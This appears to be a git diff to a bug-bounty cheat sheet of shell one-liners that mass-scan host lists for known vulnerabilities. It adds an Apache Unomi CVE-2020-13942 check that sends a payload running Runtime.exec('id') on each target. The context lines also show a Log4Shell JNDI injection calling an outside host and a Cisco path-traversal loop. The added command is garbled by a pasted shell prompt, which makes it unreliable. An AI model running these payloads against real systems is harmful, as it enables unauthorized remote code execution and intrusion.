@@ -233,6 +233,10 @@ while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst
 ```
 cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
 ```
+### CVE-2020-13942
+```
+cat targets.txt | while read host do;do  curl --insecure --silent -X POST http:/root@litt1eb0y bb2 % cat targets.txt | while read host do;do  curl --insecure --silent -X POST http://$host/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}' | grep -qs "boom" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
+```
 __________________________________________________________________________________________________________________________________________________________________
 # CORS Misconfiguration
 ```
